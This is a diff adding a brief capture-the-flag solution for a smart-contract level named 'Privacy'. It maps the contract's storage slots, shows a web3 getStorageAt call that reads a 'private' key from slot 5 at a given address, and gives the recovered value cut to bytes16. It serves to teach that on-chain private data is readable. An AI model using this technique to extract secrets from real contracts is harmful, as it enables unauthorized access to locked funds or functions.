@@ -1,0 +1,25 @@
+Privacy
+Difficulty 8/10
+
+The creator of this contract was careful enough to protect the sensitive areas of its storage.
+
+Unlock this contract to beat the level.
+
+
+Solution
+
+watch video: https://www.youtube.com/watch?v=Gg6nt3YW74o
+
+  bool public locked = true; // 1 byte slot 0
+  uint256 public ID = block.timestamp;// 32 bytes slot 1
+  uint8 private flattening = 10;// 1 byte slot 2
+  uint8 private denomination = 255; // 1 byte slot 2
+  uint16 private awkwardness = uint16(now);// 2 byte slot 2
+  bytes32[3] private data; // slot 3, 4 y 5
+
+
+script:
+  web3.eth.getStorageAt('0x20B3A238d415Ec34E566424867E23B722339Ba23', 5);
+result bytes32: 0x43329c2539bae751f2ce2181d1db0c0874ea1440cdf76c754a0cda20791790a4
+
+convert bytes32 to bytes16: 0x43329c2539bae751f2ce2181d1db0c08
